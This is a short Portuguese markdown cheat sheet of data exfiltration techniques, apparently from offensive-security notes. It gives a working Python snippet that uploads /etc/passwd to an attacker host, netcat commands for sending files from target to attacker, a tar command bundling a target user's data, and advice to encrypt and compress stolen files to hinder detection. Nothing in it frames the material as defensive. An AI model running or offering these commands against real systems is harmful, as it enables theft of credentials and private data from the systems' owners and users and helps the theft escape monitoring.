# 📤 Técnicas de Exfiltração de Dados

Após coletar informações sensíveis, realizamos a exfiltração dos dados do sistema alvo.

---

## 🛠️ 1. Exfiltração via HTTP POST

```python
import requests
files = {'file': open('/etc/passwd', 'rb')}
requests.post('http://192.168.1.120/upload', files=files)
```

---

## 🛠️ 2. Exfiltração com Netcat

```bash
nc -lvp 4444 > dados.txt     # No atacante
nc 192.168.1.120 4444 < dados.txt  # No alvo
```

---

## 🛠️ 3. Compressão antes da exfiltração

```bash
tar czf dados.tar.gz /home/alvo/dados
```

---

## ⚠️ Importante

Sempre criptografar e comprimir arquivos sensíveis para dificultar detecção:
- `gpg`, `zip -e`, `openssl enc`, etc.

